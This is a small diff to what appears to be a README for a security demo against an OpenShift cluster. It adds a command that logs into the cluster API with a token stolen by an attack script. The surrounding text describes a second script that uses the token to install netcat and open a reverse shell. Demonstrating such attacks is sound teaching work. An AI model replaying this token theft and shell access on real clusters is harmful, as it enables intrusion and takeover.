@@ -60,6 +60,8 @@ Security Demo -> ./attack_001.sh http://asset-cache-frontend.apps.cluster.local/
 
 Security Demo -> cat token
 eyJhbGciOiJSUzI1NiIsImtpZCI6ImNsbXFWcGppX1BQX1NHd....
+
+oc login --insecure-skip-tls-verify=true --token=$(cat token) --server=https://api.ocp.<server>.com:6443
 ```
 
 - **attack_002.sh** will use the token extracted from the first attack and run kubectl exec to install netcat and run a reverse shell. Kube API needs to be accessible. 
